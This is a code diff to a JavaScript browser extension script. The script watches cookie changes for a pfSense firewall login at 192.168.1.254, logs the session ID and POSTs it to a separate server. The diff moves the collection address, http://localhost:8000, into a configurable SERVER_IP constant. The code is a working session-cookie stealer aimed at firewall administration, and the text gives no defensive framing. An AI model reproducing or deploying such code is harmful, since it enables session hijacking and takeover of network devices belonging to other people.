@@ -1,4 +1,5 @@
 const PFSENSE_IP = "192.168.1.254";
+const SERVER_IP = "http://localhost:8000"
 
 browser.cookies.onChanged.addListener((changeInfo) => {
     const cookie = changeInfo.cookie;
@@ -9,7 +10,7 @@ browser.cookies.onChanged.addListener((changeInfo) => {
         console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);
         
         // Send the ID to your local Python server
-        fetch("http://localhost:8000", {
+        fetch(SERVER_IP, {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
